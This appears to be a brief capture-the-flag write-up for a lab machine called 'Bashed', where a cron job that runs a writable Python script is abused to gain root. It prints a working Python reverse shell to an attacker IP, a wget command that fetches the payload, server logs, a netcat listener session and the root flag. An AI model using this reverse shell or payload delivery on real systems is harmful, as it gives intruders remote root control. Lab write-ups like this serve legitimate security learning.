Really easy box so just a short summary of what i learned 

So User.txt was trivial literally was a webshell at /dev and from that we could also switch users to “scriptmanager”

Through this user we could edit scripts so the following POC was made

We could also see that a cronjob was running “test.py” every minute and we could basically put whatever we want in there and have it run so got the following

Let’s now create a new file called **test.py** on our Kali box and add the same reverse shell code shown below that we used previously. We’ll then transfer this to the target “Bashed” machine. You could also do this directly on the “Bashed” shell but transferring it seemed much cleaner, because on the “simple” shell we got(using editors like vi is painful).

```bash
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.125",4445));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

After this we made a http server and got it with wget

```bash
wget http://10.10.14.125:8081/home/sm1gspl0it/test.py
```

```bash
sudo python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.31.221 - - [16/Feb/2025 13:12:51] code 404, message File not found
10.129.31.221 - - [16/Feb/2025 13:12:51] "GET /test.py HTTP/1.1" 404 -
10.129.31.221 - - [16/Feb/2025 13:13:13] code 404, message File not found
10.129.31.221 - - [16/Feb/2025 13:13:13] "GET /test.py HTTP/1.1" 404 -
10.129.31.221 - - [16/Feb/2025 13:13:57] code 404, message File not found
10.129.31.221 - - [16/Feb/2025 13:13:57] "GET /test.py HTTP/1.1" 404 -
10.10.14.125 - - [16/Feb/2025 13:15:52] "GET / HTTP/1.1" 200 -
10.10.14.125 - - [16/Feb/2025 13:15:52] code 404, message File not found
10.10.14.125 - - [16/Feb/2025 13:15:52] "GET /favicon.ico HTTP/1.1" 404 -
10.10.14.125 - - [16/Feb/2025 13:16:12] "GET /home HTTP/1.1" 301 -
10.10.14.125 - - [16/Feb/2025 13:16:12] "GET /home/ HTTP/1.1" 200 -
10.10.14.125 - - [16/Feb/2025 13:16:19] "GET /home/sm1gspl0it/ HTTP/1.1" 200 -
10.129.31.221 - - [16/Feb/2025 13:17:14] "GET /home/sm1gspl0it/test.py HTTP/1.1"
```

It is worth noticing i failed abit here and realised i didnt specify the path so had to go into my browser and find the path

In any case it eventually ran and we got root

```bash
nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.125] from (UNKNOWN) [10.129.31.221] 51614
/bin/sh: 0: can't access tty; job control turned off

# whoami

root

# cd /root

# ls

root.txt

# cat root.txt

fa209abecf8802ccca6b7ee1ea0524d0

```
